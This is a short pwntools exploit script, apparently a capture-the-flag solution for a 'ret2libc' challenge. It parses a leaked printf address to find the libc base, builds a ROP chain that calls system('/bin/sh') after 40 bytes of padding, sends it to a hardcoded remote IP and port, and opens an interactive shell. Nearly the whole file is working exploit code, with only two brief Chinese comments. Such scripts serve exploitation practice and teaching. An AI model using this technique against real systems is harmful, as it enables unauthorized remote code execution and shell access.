from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
io = process("./ret2libc_patched")
io=remote("219.216.65.41",35977)
libc=ELF('./libc-2.35.so')

'''接收泄露的printf地址'''

io.recvuntil(b'\n')
buf = io.recvuntil('\n')[2:14].decode().rjust(16,'0')
libcbase = int(buf,16)-libc.sym['printf']
success(hex(libcbase))
libc.address=libcbase

'''构造rop'''

payload=b'a'*40
payload+=flat([libc.search(asm('pop rdi; ret;')).__next__(),
               libc.search(b'/bin/sh\x00').__next__(),
               libc.search(asm('pop rsi; ret;')).__next__(),
               0,
               libc.search(asm('pop rsi; ret;')).__next__()+1,
               libc.sym['system']])
io.send(payload)

io.interactive()